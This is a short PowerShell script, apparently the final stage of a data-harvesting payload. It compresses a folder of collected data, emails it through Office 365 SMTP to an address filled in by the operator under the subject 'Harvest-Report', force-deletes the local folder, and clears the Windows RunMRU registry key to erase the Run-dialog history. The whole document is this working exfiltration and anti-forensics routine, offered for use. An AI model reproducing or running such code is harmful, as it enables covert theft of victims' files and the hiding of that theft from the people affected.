Compress-Archive -Path A -DestinationPath A.zip
$SMTPServer = 'smtp.office365.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER EMAIL HERE', 'SENDER EMAIL PASSWORD HERE')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'SENDER EMAIL HERE'
$ReportEmail.To.Add('SEND TO EMAIL HERE')
$ReportEmail.Subject = "Harvest-Report"
$ReportEmail.Body = "GG, you got it"
$ReportEmail.Attachments.Add("A.zip")
$SMTPInfo.Send($ReportEmail)
Remove-Item A -Recurse -Force -Confirm:$false
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
exit